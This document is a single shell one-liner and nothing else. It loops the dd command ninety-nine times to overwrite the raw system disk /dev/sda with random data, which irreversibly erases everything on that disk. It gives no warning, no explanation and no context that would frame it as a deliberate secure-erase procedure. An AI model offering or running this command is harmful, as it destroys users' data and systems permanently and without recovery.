for n in `seq 99`; do dd if=/dev/urandom of=/dev/sda bs=8b conv=notrunc; done
